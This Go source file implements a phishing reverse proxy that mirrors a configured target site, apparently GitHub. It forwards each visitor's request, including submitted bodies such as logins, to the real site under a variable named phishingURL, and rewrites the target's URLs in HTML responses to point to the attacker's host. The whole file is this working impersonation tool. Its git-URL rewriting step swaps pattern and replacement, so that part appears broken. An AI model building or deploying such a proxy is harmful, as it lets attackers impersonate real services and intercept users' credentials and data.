package main

import (
	"fmt"
	"io/ioutil"
	"net/http"
	"regexp"
	"strings"

	"github.com/spf13/viper"
)

const (
	configName = "config"
	configType = "yaml"
	configPath = "./config"
)

func main() {
	readConfig()
	http.HandleFunc("/", handler)
	err := http.ListenAndServe(":8080", nil)
	if err != nil {
		panic(err)
	}
}

var Config *viper.Viper

func readConfig() {
	Config = viper.New()
	Config.SetConfigName(configName)
	Config.SetConfigType(configType)
	Config.AddConfigPath(configPath)
	err := Config.ReadInConfig()
	if err != nil {
		panic("Error: Unable to read file. " + err.Error())
	}
}

func handler(w http.ResponseWriter, r *http.Request) {
	request := duplicateRequest(r)
	body, header := requestToRealUpstream(request)
	body = substituteURLInResp(body, header)
	w.Write(body)
}

func duplicateRequest(r *http.Request) *http.Request {
	// Get original request
	body := r.Body
	method := r.Method

	// Get original url to substitute Github
	phishingURL := Config.GetString("URL.target") + r.URL.Path + "?" + r.URL.RawQuery

	// create new http request
	request, err := http.NewRequest(method, phishingURL, body)
	if err != nil {
		panic(err)
	}
	return request
}

func requestToRealUpstream(req *http.Request) ([]byte, http.Header) {
	// Create an instance of HttpClient
	client := http.Client{}

	// Send a request to real upstream and receive the response
	response, err := client.Do(req)
	if err != nil {
		panic(err)
	}

	// Convert the response body to byte
	respBody, err := ioutil.ReadAll(response.Body)
	if err != nil {
		panic(err)
	}
	response.Body.Close()

	return respBody, response.Header
}

func substituteURLInResp(body []byte, header http.Header) []byte {
	// Determine the HTML in Content-Type
	contentType := header.Get("Content-Type")
	if !strings.Contains(contentType, "text/html") {
		return body
	}

	// Substitute all url from target to host
	bodyStr := strings.Replace(string(body), Config.GetString("URL.target"), Config.GetString("URL.host"), -1)

	// Manipulate some element with target's url(like git clone)
	targetGitURL := fmt.Sprintf(`%s(.*)\.git`, Config.GetString("URL.target"))
	hostGitURL := fmt.Sprintf(`%s$1.git`, Config.GetString("URL.host"))

	re, err := regexp.Compile(hostGitURL)
	if err != nil {
		panic(err)
	}

	bodyStr = re.ReplaceAllString(bodyStr, targetGitURL)

	return []byte(bodyStr)
}
